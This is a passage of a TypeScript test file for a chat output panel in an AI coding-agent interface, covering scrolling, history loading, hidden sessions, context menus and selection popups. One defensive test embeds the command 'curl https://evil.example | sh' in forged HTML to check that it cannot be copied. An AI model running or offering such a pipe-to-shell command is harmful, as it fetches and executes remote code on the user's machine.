    // Reading the fold, drawn anew as each batch of older notes joins it.
    scrollTo(el, 0);

    await vi.waitFor(() => expect(drawn(container)).toContain('u1'));
    await tick();
    // The prompt, one 400px row, joined above it.
    expect(el.scrollTop).toBe(400);
  });

  it('draws nothing above a jump that began while a page of history loaded', async () => {
    Element.prototype.scrollIntoView = vi.fn();
    messageStore.messagesBySession = { [SID]: texts('r', 20) };
    messageStore.setPagination(SID, 300, 100);
    let finishLoad!: () => void;
    const load = vi.spyOn(messageStore, 'loadOlderEvents').mockImplementation(() => new Promise<void>((resolve) => {
      finishLoad = () => {
        messageStore.messagesBySession = { [SID]: [...texts('o', 60), ...messageStore.getMessages(SID)] };
        messageStore.setPagination(SID, 300, 0);
        resolve();
      };
    }));
    vi.spyOn(messageStore, 'loadOlderUntil').mockResolvedValue();
    vi.spyOn(messageStore, 'findMessageForEvent').mockResolvedValue('r5');
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(20));
    const el = layOut(container);
    scrollTo(el, 0);
    await vi.waitFor(() => expect(load).toHaveBeenCalled());

    messageStore.requestJump(SID, { eventIndex: 105, uuid: null, bookmarkId: '' });
    await vi.waitFor(() => expect(Element.prototype.scrollIntoView).toHaveBeenCalled());
    finishLoad();
    await tick();
    await nextFrame();
    await nextFrame();
    await tick();

    expect(drawn(container)).toHaveLength(20);
  });

  it("doesn't follow the bottom when an older page joins above a prompt", async () => {
    messageStore.messagesBySession = { [SID]: [...texts('r', 20), { kind: 'user', id: 'u1', text: 'go on' }] };
    const { container, getByTitle, findByTitle } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(21));
    const el = layOut(container);
    scrollTo(el, 600);
    await findByTitle('Scroll to bottom');

    // As the "Load older events" button or a jump loads a page.
    messageStore.messagesBySession = { [SID]: [...texts('o', 60), ...messageStore.getMessages(SID)] };
    await tick();

    expect(getByTitle('Scroll to bottom')).toBeInTheDocument();
    expect(drawn(container)[0]).toBe('r0');
  });

  it("waits for the reader's own scroll after a jump", async () => {
    Element.prototype.scrollIntoView = vi.fn();
    messageStore.messagesBySession = { [SID]: texts('m', 80) };
    vi.spyOn(messageStore, 'loadOlderUntil').mockResolvedValue();
    vi.spyOn(messageStore, 'findMessageForEvent').mockResolvedValue('m30');
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(50));
    const el = layOut(container);

    messageStore.requestJump(SID, { eventIndex: 30, uuid: null, bookmarkId: '' });
    await vi.waitFor(() => expect(Element.prototype.scrollIntoView).toHaveBeenCalled());
    // The jump's smooth scroll passes near the top.
    scrollTo(el, 100);
    await nextFrame();
    await tick();
    expect(drawn(container)).toHaveLength(50);

    await fireEvent.wheel(el);
    scrollTo(el, 50);
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(80));
  });
});

describe('OutputPanel: a thread too short to scroll reads on', () => {
  const texts = (prefix: string, n: number): ChatMessage[] =>
    Array.from({ length: n }, (_, i) => ({ kind: 'text', id: `${prefix}${i}`, text: `${prefix} ${i}`, uuid: `${prefix}-${i}` }));
  const tools = (prefix: string, n: number): ChatMessage[] =>
    Array.from({ length: n }, (_, i) => ({ kind: 'tool_call', id: `${prefix}${i}`, toolName: 'Read', toolInput: { file_path: 'a.ts' }, toolUseId: `${prefix}-tu${i}`, uuid: `${prefix}-${i}`, pending: false }));
  const drawn = (container: HTMLElement) => [...container.querySelectorAll<HTMLElement>('[data-msg-id]')].map((el) => el.dataset.msgId);
  const nextFrame = () => new Promise((r) => requestAnimationFrame(r));

  /** loadOlderEvents, prepending `pages` (newest first) one per call, with
   *  `left[i]` events still unloaded after page i. */
  function pagesOfHistory(pages: ChatMessage[][], left: number[]) {
    return vi.spyOn(messageStore, 'loadOlderEvents').mockImplementation(async () => {
      messageStore.messagesBySession = { [SID]: [...pages.shift()!, ...messageStore.getMessages(SID)] };
      messageStore.setPagination(SID, 600, left.shift()!);
    });
  }

  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.setViewMode(SID, 'detailed');
  });
  afterEach(() => vi.restoreAllMocks());

  it('reads older history until a Focus thread whose newest page shows nothing fills the view', async () => {
    messageStore.setViewMode(SID, 'focus');
    // The newest page: tool calls only, which Focus hides.
    messageStore.messagesBySession = { [SID]: tools('t', 30) };
    messageStore.setPagination(SID, 600, 400);
    // The prompt and its reply, two rows; then ten more rows of replies.
    const load = pagesOfHistory(
      [[{ kind: 'user', id: 'u1', text: 'fix it' }, { kind: 'text', id: 'ans', text: 'Done', uuid: 'a-ans' }], texts('o', 10)],
      [200, 100],
    );
    const { container, queryByText } = render(OutputPanel, { sessionId: SID });
    layOut(container);
    // Not an empty new thread.
    expect(queryByText('Waiting for input...')).not.toBeInTheDocument();

    await vi.waitFor(() => expect(drawn(container)).toContain('o0'));
    expect(drawn(container)).toContain('ans');
    // Twelve rows of 100px scroll in 500px: scrolling up reads the rest.
    await nextFrame();
    await tick();
    expect(load).toHaveBeenCalledTimes(2);
  });

  it('reads nothing more while the thread fills the view', async () => {
    messageStore.messagesBySession = { [SID]: texts('r', 20) };
    messageStore.setPagination(SID, 300, 100);
    const load = pagesOfHistory([texts('o', 60)], [0]);
    const { container } = render(OutputPanel, { sessionId: SID });
    layOut(container);

    await vi.waitFor(() => expect(drawn(container)).toHaveLength(20));
    await nextFrame();
    await nextFrame();
    await tick();
    expect(load).not.toHaveBeenCalled();
  });

  it('reads on only once a hidden conversation is opened', async () => {
    store.activeSessionId = 'another-session';
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: tools('t', 30) };
    messageStore.setPagination(SID, 600, 400);
    const load = pagesOfHistory([texts('o', 10)], [0]);
    const { container } = render(OutputPanel, { sessionId: SID });
    layOut(container);
    await nextFrame();
    await nextFrame();
    expect(load).not.toHaveBeenCalled();

    store.activeSessionId = SID;

    await vi.waitFor(() => expect(drawn(container)).toContain('o0'));
    expect(load).toHaveBeenCalledTimes(1);
  });

  /** One run of notes between tool calls (hidden in Focus) after a prompt,
   *  then the answer: 72 messages Focus shows, the newest 50 of them drawn
   *  as a fold of notes and the answer, two rows. */
  const foldedThread = (): ChatMessage[] => {
    const run = Array.from({ length: 70 }, (_, i) => [texts('n', 70)[i], tools('t', 70)[i]]).flat();
    return [{ kind: 'user', id: 'u1', text: 'fix it' }, ...run, { kind: 'text', id: 'ans', text: 'Done', uuid: 'a-ans' }];
  };

  it('draws the loaded messages it held back first, a batch per frame', async () => {
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: foldedThread() };
    const load = vi.spyOn(messageStore, 'loadOlderEvents');
    const { container } = render(OutputPanel, { sessionId: SID });
    layOut(container);

    // How many are drawn, frame by frame.
    const counts = [drawn(container).length];
    for (let i = 0; i < 30 && !drawn(container).includes('u1'); i++) {
      await nextFrame();
      await tick();
      counts.push(drawn(container).length);
    }

    expect(drawn(container)).toContain('u1');
    const steps = counts.slice(1).map((n, i) => n - counts[i]);
    expect(Math.max(...steps)).toBeLessThanOrEqual(10);
    // Past the 50 a load draws, so the fill drew some of them, in batches.
    expect(counts.some((n) => n > 50 && n < 72)).toBe(true);
    // Nothing more to read.
    expect(load).not.toHaveBeenCalled();
  });

  it('keeps what it drew when a prompt is sent', async () => {
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: foldedThread() };
    const { container } = render(OutputPanel, { sessionId: SID });
    layOut(container);
    await vi.waitFor(() => expect(drawn(container)).toContain('u1'));

    messageStore.messagesBySession = { [SID]: [...messageStore.getMessages(SID), { kind: 'user', id: 'u2', text: 'and the tests' }] };
    await tick();

    // Not back to the newest 50, which start at n21.
    expect(drawn(container)).toContain('n0');
    expect(drawn(container)).toContain('u2');
  });

  it('stops reading by itself after 2000 events, until Load older is clicked', async () => {
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: tools('t', 5) };
    messageStore.setPagination(SID, 10_000, 9_800);
    // Every page holds only tool calls, which Focus hides.
    let page = 0;
    const load = vi.spyOn(messageStore, 'loadOlderEvents').mockImplementation(async () => {
      page++;
      messageStore.messagesBySession = { [SID]: [...tools(`p${page}-`, 2), ...messageStore.getMessages(SID)] };
      messageStore.setPagination(SID, 10_000, 9_800 - page * 200);
    });
    const { container, findByRole } = render(OutputPanel, { sessionId: SID });
    layOut(container);

    await vi.waitFor(() => expect(load).toHaveBeenCalledTimes(10));
    await nextFrame();
    await nextFrame();
    expect(load).toHaveBeenCalledTimes(10);

    await fireEvent.click(await findByRole('button', { name: /Load 7800 older events/ }));

    // The click's page, then ten more by itself.
    await vi.waitFor(() => expect(load).toHaveBeenCalledTimes(21));
    await nextFrame();
    await nextFrame();
    expect(load).toHaveBeenCalledTimes(21);
  });

  it("doesn't try a page that failed to read again by itself", async () => {
    const logged = vi.spyOn(console, 'error').mockImplementation(() => {});
    messageStore.setViewMode(SID, 'focus');
    messageStore.messagesBySession = { [SID]: tools('t', 5) };
    messageStore.setPagination(SID, 600, 400);
    const load = vi.spyOn(messageStore, 'loadOlderEvents').mockRejectedValue(new Error('unreadable'));
    const { container, getByRole } = render(OutputPanel, { sessionId: SID });
    layOut(container);

    await vi.waitFor(() => expect(logged).toHaveBeenCalled());
    for (let i = 0; i < 5; i++) await nextFrame();
    expect(load).toHaveBeenCalledTimes(1);
    // Still offered, to try by hand.
    expect(getByRole('button', { name: /Load 400 older events/ })).toBeInTheDocument();
  });

  describe('as the view or its rows change height', () => {
    type Callback = () => void;
    let observers: { callback: Callback; targets: Set<Element> }[];
    beforeEach(() => {
      observers = [];
      vi.stubGlobal('ResizeObserver', class {
        private entry: { callback: Callback; targets: Set<Element> };
        constructor(callback: Callback) {
          this.entry = { callback, targets: new Set() };
          observers.push(this.entry);
        }
        observe(el: Element) { this.entry.targets.add(el); }
        unobserve(el: Element) { this.entry.targets.delete(el); }
        disconnect() { this.entry.targets.clear(); }
      });
    });
    afterEach(() => vi.unstubAllGlobals());

    /** A thread of eight 100px replies (scrolling 300px in 500px) with
     *  history left to read. */
    async function scrollingThread() {
      messageStore.messagesBySession = { [SID]: texts('r', 8) };
      messageStore.setPagination(SID, 600, 400);
      const load = pagesOfHistory([texts('o', 10)], [200]);
      const { container } = render(OutputPanel, { sessionId: SID });
      const el = layOut(container);
      await vi.waitFor(() => expect(drawn(container)).toHaveLength(8));
      await nextFrame();
      await tick();
      expect(load).not.toHaveBeenCalled();
      return { el, load, container };
    }

    it('reads on when the view gets taller', async () => {
      const { el, load } = await scrollingThread();

      Object.defineProperty(el, 'clientHeight', { configurable: true, value: 2000 });
      observers.find((o) => o.targets.has(el))!.callback();

      await vi.waitFor(() => expect(load).toHaveBeenCalledTimes(1));
    });

    it('reads on when a row gets shorter', async () => {
      const { el, load, container } = await scrollingThread();
      const rows = observers.find((o) => [...o.targets].some((t) => t !== el))!;
      expect(rows.targets.size).toBe(8);

      // A tall block in one of them closed: 500px of rows in all.
      Object.defineProperty(el, 'scrollHeight', { configurable: true, value: 500 });
      rows.callback();

      await vi.waitFor(() => expect(load).toHaveBeenCalledTimes(1));
      expect(drawn(container)).toContain('o0');
    });
  });
});

describe("OutputPanel: a hidden conversation's chat", () => {
  const replies = (n: number) => Array.from({ length: n }, (_, i) => ({ kind: 'text', id: `m${i}`, text: `reply ${i}`, uuid: `a${i}` }));
  const drawn = (container: HTMLElement) => [...container.querySelectorAll<HTMLElement>('[data-msg-id]')].map((el) => el.dataset.msgId);

  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.setViewMode(SID, 'detailed');
  });
  afterEach(() => { messageStore.activeTabBySession = {}; });

  /** Render with `before` drawn, then hide the conversation while it gets to `after`. */
  async function workOutOfSight(before: number, after: number) {
    messageStore.messagesBySession = { [SID]: replies(before) as never };
    const result = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(result.container)).toHaveLength(before));
    store.activeSessionId = 'another';
    await tick();
    messageStore.messagesBySession = { [SID]: replies(after) as never };
    await tick();
    return result;
  }

  it('stands still while hidden, and shows what came meanwhile when opened', async () => {
    const { container } = await workOutOfSight(3, 5);
    expect(drawn(container)).toEqual(['m0', 'm1', 'm2']);

    store.activeSessionId = SID;
    await tick();

    expect(drawn(container)).toEqual(['m0', 'm1', 'm2', 'm3', 'm4']);
  });

  it('keeps up on another tab of the open conversation', async () => {
    messageStore.messagesBySession = { [SID]: replies(3) as never };
    const { container } = render(OutputPanel, { sessionId: SID });
    messageStore.setActiveTab(SID, 'changes');

    messageStore.messagesBySession = { [SID]: replies(4) as never };
    await tick();

    expect(drawn(container)).toHaveLength(4);
  });

  it('draws much that came meanwhile newest first, then the rest a batch per frame', async () => {
    const { container } = await workOutOfSight(5, 30);
    const kept = container.querySelector('[data-msg-id="m2"]');

    store.activeSessionId = SID;
    await tick();

    const ids = (from: number, to: number) => Array.from({ length: to - from }, (_, i) => `m${from + i}`);
    expect(drawn(container)).toEqual([...ids(0, 5), ...ids(20, 30)]);
    await vi.waitFor(() => expect(drawn(container)).toEqual(ids(0, 30)));
    // The rows drawn before are the same rows, with whatever was opened in them.
    expect(container.querySelector('[data-msg-id="m2"]')).toBe(kept);
  });

  it('draws a history replaced while hidden as a load', async () => {
    const { container } = await workOutOfSight(12, 12);
    messageStore.messagesBySession = {
      [SID]: Array.from({ length: 12 }, (_, i) => ({ kind: 'text', id: `n${i}`, text: `again ${i}`, uuid: `b${i}` })) as never,
    };

    store.activeSessionId = SID;
    await tick();

    expect(drawn(container)).toEqual(['n2', 'n3', 'n4', 'n5', 'n6', 'n7', 'n8', 'n9', 'n10', 'n11']);
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(12));
  });

  it("isn't drawn again when its view changed while hidden", async () => {
    messageStore.setViewMode(SID, 'summary');
    messageStore.messagesBySession = {
      [SID]: [...replies(12), ...Array.from({ length: 12 }, (_, i) => ({ kind: 'thinking', id: `t${i}`, thinking: 'Hmm' }))] as never,
    };
    const { container } = render(OutputPanel, { sessionId: SID });
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(12));
    store.activeSessionId = 'another';
    await tick();
    // Detailed shows the thinking too: the hidden chat redraws with it.
    messageStore.setViewMode(SID, 'detailed');
    await vi.waitFor(() => expect(drawn(container)).toHaveLength(24));
    const kept = container.querySelector('[data-msg-id="m2"]');

    store.activeSessionId = SID;
    await tick();

    expect(drawn(container)).toHaveLength(24);
    expect(container.querySelector('[data-msg-id="m2"]')).toBe(kept);
  });

  it('follows the conversation again when a prompt went out while hidden', async () => {
    messageStore.messagesBySession = { [SID]: replies(5) as never };
    const { container, findByTitle, queryByTitle } = render(OutputPanel, { sessionId: SID });
    const el = container.querySelector<HTMLElement>('.overflow-y-auto')!;
    for (const [key, value] of Object.entries({ scrollTop: 0, scrollHeight: 2000, clientHeight: 500 })) {
      Object.defineProperty(el, key, { configurable: true, writable: true, value });
    }
    el.dispatchEvent(new Event('scroll'));
    await findByTitle('Scroll to bottom');
    store.activeSessionId = 'another';
    await tick();
    // A prompt queued before leaving goes out, and the agent answers it.
    messageStore.messagesBySession = {
      [SID]: [...replies(5), { kind: 'user', id: 'u1', text: 'next' }, { kind: 'text', id: 'r1', text: 'Done', uuid: 'b1' }] as never,
    };

    store.activeSessionId = SID;
    await tick();

    expect(queryByTitle('Scroll to bottom')).toBeNull();
  });

  it('draws a little that came meanwhile at once', async () => {
    const { container } = await workOutOfSight(5, 12);

    store.activeSessionId = SID;
    await tick();

    expect(drawn(container)).toHaveLength(12);
  });

  it('draws it all at once below a reader who scrolled up', async () => {
    messageStore.messagesBySession = { [SID]: replies(5) as never };
    const { container, findByTitle } = render(OutputPanel, { sessionId: SID });
    const el = container.querySelector<HTMLElement>('.overflow-y-auto')!;
    for (const [key, value] of Object.entries({ scrollTop: 0, scrollHeight: 2000, clientHeight: 500 })) {
      Object.defineProperty(el, key, { configurable: true, writable: true, value });
    }
    el.dispatchEvent(new Event('scroll'));
    await findByTitle('Scroll to bottom');
    store.activeSessionId = 'another';
    await tick();
    messageStore.messagesBySession = { [SID]: replies(30) as never };

    store.activeSessionId = SID;
    await tick();

    expect(drawn(container)).toHaveLength(30);
  });
});

describe('OutputPanel: the first turn', () => {
  const session = (status: string) => ({ id: SID, branch: 'b', repoPath: '/repo', status, agentType: 'claude-code', createdAt: 0 }) as (typeof store.sessions)[number];

  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.isRunning = { [SID]: true };
    messageStore.streamingText = {};
    settingsStore.current.groveCharacters = true;
  });

  afterEach(() => {
    arrivalScene.end(SID);
    messageStore.isRunning = {};
    messageStore.activityBySession = {};
    settingsStore.current.groveCharacters = true;
  });

  it('shows the agent walking to its bench instead of an empty chat and the working row', () => {
    // As just after Start: the message only shows once the agent is ready.
    store.sessions = [session('starting')];
    arrivalScene.begin(SID);
    const { container, queryByText, getByText } = render(OutputPanel, { sessionId: SID });
    expect(container.querySelector('svg.walk')).not.toBeNull();
    expect(getByText('Starting agent...')).toBeInTheDocument();
    expect(queryByText('Waiting for input...')).toBeNull();
    expect(queryByText('Working...')).toBeNull();
  });

  it('captions it with what the agent is doing once it runs', () => {
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    messageStore.activityBySession = { [SID]: { activity: 'thinking' } };
    arrivalScene.begin(SID);
    const { container, getByText } = render(OutputPanel, { sessionId: SID });
    expect(container.querySelector('svg.walk')).not.toBeNull();
    expect(getByText('Fix it')).toBeInTheDocument();
    expect(getByText('Thinking...')).toBeInTheDocument();
  });

  it('gives way to the first reply, and is over', async () => {
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    arrivalScene.begin(SID);
    const { container, getByText } = render(OutputPanel, { sessionId: SID });
    expect(container.querySelector('svg.walk')).not.toBeNull();

    messageStore.messagesBySession = { [SID]: [
      { kind: 'user', id: 'u1', text: 'Fix it' },
      { kind: 'text', id: 't1', text: 'On it', uuid: 'a1' },
    ] };
    await tick();
    expect(container.querySelector('svg.walk')).toBeNull();
    expect(getByText('Working...')).toBeInTheDocument();
    expect(arrivalScene.for(SID)).toBeNull();
  });

  it('begins for a first message sent after starting without one', async () => {
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();
    expect(arrivalScene.for(SID)).not.toBeNull();
    expect(container.querySelector('svg.walk')).not.toBeNull();
  });

  it('ends at a turn that ends without a reply, though Focus hides its end', async () => {
    messageStore.setViewMode(SID, 'focus');
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    arrivalScene.begin(SID);
    const { container } = render(OutputPanel, { sessionId: SID });
    expect(container.querySelector('svg.walk')).not.toBeNull();

    messageStore.messagesBySession = { [SID]: [
      { kind: 'user', id: 'u1', text: 'Fix it' },
      { kind: 'result', id: 'r1', subtype: 'success', isError: false },
    ] };
    messageStore.isRunning = { [SID]: false };
    await tick();
    expect(arrivalScene.for(SID)).toBeNull();
    expect(container.querySelector('svg.walk')).toBeNull();
    messageStore.setViewMode(SID, 'detailed');
  });

  it('ends when the agent stops without a reply', async () => {
    store.sessions = [session('running')];
    arrivalScene.begin(SID);
    render(OutputPanel, { sessionId: SID });
    store.sessions = [session('stopped')];
    await tick();
    expect(arrivalScene.for(SID)).toBeNull();
  });

  it('ends at a reply that came while hidden once its conversation is opened', async () => {
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    arrivalScene.begin(SID);
    render(OutputPanel, { sessionId: SID });
    store.activeSessionId = 'another';
    await tick();

    messageStore.messagesBySession = { [SID]: [
      { kind: 'user', id: 'u1', text: 'Fix it' },
      { kind: 'text', id: 't1', text: 'On it', uuid: 'a1' },
    ] };
    await tick();
    // Hidden, the chat stands still: the reply isn't in it yet.
    expect(arrivalScene.for(SID)).not.toBeNull();

    store.activeSessionId = SID;
    await tick();
    expect(arrivalScene.for(SID)).toBeNull();
  });

  it('ends while hidden when the agent stops without a reply', async () => {
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    arrivalScene.begin(SID);
    render(OutputPanel, { sessionId: SID });
    store.activeSessionId = 'another';
    await tick();

    store.sessions = [session('error')];
    await tick();

    expect(arrivalScene.for(SID)).toBeNull();
  });

  it("doesn't begin again while hidden once the live reply has ended it", async () => {
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    arrivalScene.begin(SID);
    render(OutputPanel, { sessionId: SID });
    store.activeSessionId = 'another';
    await tick();
    messageStore.streamingText = { [SID]: 'On it' };
    await tick();
    expect(arrivalScene.for(SID)).toBeNull();

    // The reply is final: the live text clears, and the chat, standing still, doesn't show it yet.
    messageStore.streamingText = {};
    await tick();

    expect(arrivalScene.for(SID)).toBeNull();
  });

  it('keeps the working row with grove characters off', () => {
    settingsStore.current.groveCharacters = false;
    store.sessions = [session('running')];
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'Fix it' }] };
    arrivalScene.begin(SID);
    const { container, getByText } = render(OutputPanel, { sessionId: SID });
    expect(container.querySelector('svg.walk')).toBeNull();
    expect(getByText('Working...')).toBeInTheDocument();
  });
});

describe('OutputPanel: right-click menu', () => {
  let writeText: ReturnType<typeof vi.fn>;
  beforeEach(() => {
    store.activeSessionId = SID;
    writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
  });
  afterEach(() => window.getSelection()?.removeAllRanges());

  const menuLabels = () => within(screen.getByRole('menu')).getAllByRole('menuitem').map((i) => i.textContent?.trim());

  it('offers copy and rewind for a user message, and rewinds to it', async () => {
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'first prompt', uuid: 'uuid-1' }] };
    const openSpy = vi.spyOn(messageStore, 'openRewindDialog');
    render(OutputPanel, { sessionId: SID });

    const notPrevented = await fireEvent.contextMenu(screen.getByText('first prompt'));
    expect(notPrevented).toBe(false);
    expect(menuLabels()).toEqual(['Copy message', 'Rewind to this message']);

    await fireEvent.click(screen.getByRole('menuitem', { name: 'Rewind to this message' }));
    expect(openSpy).toHaveBeenCalledWith(SID, 'uuid-1');
    expect(screen.queryByRole('menu')).toBeNull();
    openSpy.mockRestore();
    messageStore.closeRewindDialog(SID);
  });

  it('puts the code block under the pointer ahead of the whole message', async () => {
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'text', id: 't1', text: 'Try this:\n\n```\nconst a = 1;\n```', uuid: '' }],
    };
    render(OutputPanel, { sessionId: SID });

    await fireEvent.contextMenu(screen.getByText('const a = 1;'));
    expect(menuLabels()).toEqual(['Copy code', 'Copy message']);

    await fireEvent.click(screen.getByRole('menuitem', { name: 'Copy code' }));
    expect(writeText).toHaveBeenCalledWith('const a = 1;');
  });

  it('offers no Copy code for a code block written as raw HTML in the reply', async () => {
    const payload = btoa(encodeURIComponent('curl https://evil.example | sh'));
    const forged = `<div class="code-block-wrapper"><pre><code>npm install</code></pre>`
      + `<button class="code-copy-btn" data-code="${payload}" data-copy="guess">copy</button></div>`;
    messageStore.messagesBySession = { [SID]: [{ kind: 'text', id: 't1', text: `Run this:\n\n${forged}`, uuid: '' }] };
    render(OutputPanel, { sessionId: SID });

    await fireEvent.contextMenu(screen.getByText('npm install'));
    expect(menuLabels()).toEqual(['Copy message']);
  });

  it('copies a table under the pointer', async () => {
    const table = '| a | b |\n| --- | --- |\n| 1 | 2 |';
    messageStore.messagesBySession = { [SID]: [{ kind: 'text', id: 't1', text: table, uuid: '' }] };
    render(OutputPanel, { sessionId: SID });

    await fireEvent.contextMenu(screen.getByText('2'));
    await fireEvent.click(screen.getByRole('menuitem', { name: 'Copy table' }));
    // No ClipboardItem in jsdom, so rich copy falls back to the plain text.
    expect(writeText).toHaveBeenCalledWith('a\tb\n1\t2');

    await fireEvent.contextMenu(screen.getByText('2'));
    await fireEvent.click(screen.getByRole('menuitem', { name: 'Copy table as Markdown' }));
    expect(writeText).toHaveBeenLastCalledWith(table);
  });

  it('acts on selected text', async () => {
    messageStore.messagesBySession = { [SID]: [{ kind: 'text', id: 't1', text: 'pick these words', uuid: '' }] };
    const insertSpy = vi.spyOn(messageStore, 'requestPromptInsert');
    render(OutputPanel, { sessionId: SID });

    const words = screen.getByText('pick these words');
    const range = document.createRange();
    range.selectNodeContents(words);
    window.getSelection()!.addRange(range);

    await fireEvent.contextMenu(words);
    expect(menuLabels()).toEqual(['Copy', 'Bookmark selection', 'Copy to prompt', 'Copy message']);
    await fireEvent.click(screen.getByRole('menuitem', { name: 'Copy to prompt' }));
    expect(insertSpy).toHaveBeenCalledWith(SID, 'pick these words');
    insertSpy.mockRestore();
  });

  it('leaves right-clicks with nothing to offer alone', async () => {
    const { getByText } = render(OutputPanel, { sessionId: SID });
    expect(await fireEvent.contextMenu(getByText('Waiting for input...'))).toBe(true);
    expect(screen.queryByRole('menu')).toBeNull();
  });

});

describe('OutputPanel: selection popup', () => {
  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.messagesBySession = { [SID]: [{ kind: 'text', id: 't1', text: 'pick these words', uuid: '' }] };
    // jsdom's Range has no layout; the popup only needs a rect to place itself.
    Object.defineProperty(Range.prototype, 'getBoundingClientRect', { configurable: true, value: () => new DOMRect() });
  });
  afterEach(() => {
    window.getSelection()?.removeAllRanges();
    delete (Range.prototype as { getBoundingClientRect?: unknown }).getBoundingClientRect;
  });

  const popup = () => screen.queryByRole('button', { name: 'Bookmark' });

  /** Select the reply's text and release the mouse in the pane. */
  async function selectWords(button = 0) {
    const { container } = render(OutputPanel, { sessionId: SID });
    const range = document.createRange();
    range.selectNodeContents(screen.getByText('pick these words'));
    window.getSelection()!.addRange(range);
    await fireEvent.mouseUp(container.querySelector<HTMLElement>('.overflow-y-auto')!, { button });
  }

  it('opens on a left-button release only', async () => {
    await selectWords(2);
    expect(popup()).toBeNull();
    await fireEvent.mouseUp(screen.getByText('pick these words'), { button: 0 });
    expect(popup()).toBeInTheDocument();
  });

  it('hides on a press outside it, such as the prompt box', async () => {
    await selectWords();
    await fireEvent.mouseDown(document.body);
    expect(popup()).toBeNull();
  });

  it('hides when the window loses focus', async () => {
    await selectWords();
    await fireEvent.blur(window);
    expect(popup()).toBeNull();
  });

  it('hides when the selection goes away', async () => {
    await selectWords();
    window.getSelection()!.removeAllRanges();
    await fireEvent(document, new Event('selectionchange'));
    expect(popup()).toBeNull();
  });

  it('stays while the selection is unchanged, and pressing its buttons keeps it', async () => {
    await selectWords();
    await fireEvent(document, new Event('selectionchange'));
    const pressed = await fireEvent.mouseDown(popup()!);
    expect(pressed).toBe(false);
    expect(popup()).toBeInTheDocument();

    const insertSpy = vi.spyOn(messageStore, 'requestPromptInsert');
    await fireEvent.click(screen.getByRole('button', { name: 'To prompt' }));
    expect(insertSpy).toHaveBeenCalledWith(SID, 'pick these words', {});
    insertSpy.mockRestore();
  });
});

describe('OutputPanel: notes while working', () => {
  const turn = (): ChatMessage[] => [
    { kind: 'user', id: 'u1', text: 'fix it' },
    { kind: 'text', id: 'n1', text: 'Let me check the config', uuid: 'a1' },
    { kind: 'tool_call', id: 't1', toolName: 'Read', toolInput: { file_path: 'a.ts' }, toolUseId: 'tu1', uuid: 'a2', pending: false },
    { kind: 'text', id: 'n2', text: 'Now the tests', uuid: 'a3' },
    { kind: 'tool_call', id: 't2', toolName: 'Grep', toolInput: { pattern: 'x' }, toolUseId: 'tu2', uuid: 'a4', pending: false },
    { kind: 'text', id: 'ans', text: 'Fixed the null check', uuid: 'a5' },
  ];

  it('folds them into one closed line in Focus and keeps the answer open', async () => {
    messageStore.messagesBySession = { [SID]: turn() };
    messageStore.setViewMode(SID, 'focus');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    const fold = container.querySelector<HTMLDetailsElement>('details[data-notes]')!;
    expect(fold.open).toBe(false);
    expect(fold.querySelector('summary')).toHaveTextContent('2 notes while working');
    expect(fold.querySelector('[data-msg-id="n1"]')).not.toBeNull();
    expect(fold.querySelector('[data-msg-id="n2"]')).not.toBeNull();
    expect(container.querySelector('[data-msg-id="ans"]')!.closest('details')).toBeNull();
  });

  it("folds them with the turn's steps in Summary, in order, and keeps the answer open", async () => {
    const [user, n1, t1, n2, t2, ans] = turn();
    const edit: ChatMessage = { kind: 'tool_call', id: 'e1', toolName: 'Edit', toolInput: { file_path: 'a.ts', old_string: 'a', new_string: 'b' }, toolUseId: 'tu-e1', uuid: 'a6', pending: false };
    messageStore.messagesBySession = { [SID]: [user, n1, t1, edit, n2, t2, ans] };
    messageStore.setViewMode(SID, 'summary');
    const { container, getByRole } = render(OutputPanel, { sessionId: SID });
    await tick();

    // Folded behind the strip: the notes and the steps; the answer stays.
    expect(container.querySelector('details[data-notes]')).toBeNull();
    for (const id of ['n1', 't1', 'e1', 'n2', 't2']) expect(container.querySelector(`[data-msg-id="${id}"]`)).toBeNull();
    expect(container.querySelector('[data-msg-id="ans"]')).not.toBeNull();

    await fireEvent.click(getByRole('button', { name: /Worked/ }));
    const drawnIds = [...container.querySelectorAll('[data-msg-id]')].map((el) => el.getAttribute('data-msg-id'));
    expect(drawnIds).toEqual(['u1', 'n1', 't1', 'e1', 'n2', 't2', 'ans']);
  });

  it('leaves them in line in Detailed', async () => {
    messageStore.messagesBySession = { [SID]: turn() };
